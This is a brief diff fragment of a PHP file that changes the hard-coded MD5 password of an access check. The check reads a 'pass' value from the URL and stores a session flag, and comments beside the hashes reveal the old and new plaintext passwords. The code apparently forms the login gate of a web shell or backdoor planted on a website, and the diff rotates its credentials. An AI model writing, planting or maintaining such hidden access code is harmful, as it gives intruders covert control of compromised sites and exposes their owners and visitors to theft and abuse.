@@ -19,7 +19,7 @@ if (file_exists($filenameseo)) {
 
 @session_start();
 $session_name = md5("1x5sa5hakA654asrKJAGSRKMJHjhas");
-$password = "ded7f7852eedf6ab10852970f015e100"; // sellex
+$password = "4cfb8bed080144c335b03ba2e493f3e9"; // mangsut#123
 if ( !isset($_SESSION[$session_name]) ||($_SESSION[$session_name] != "OK") ) {
 	if(isset($_GET['pass'])){
 		$getpass = md5($_GET['pass']);
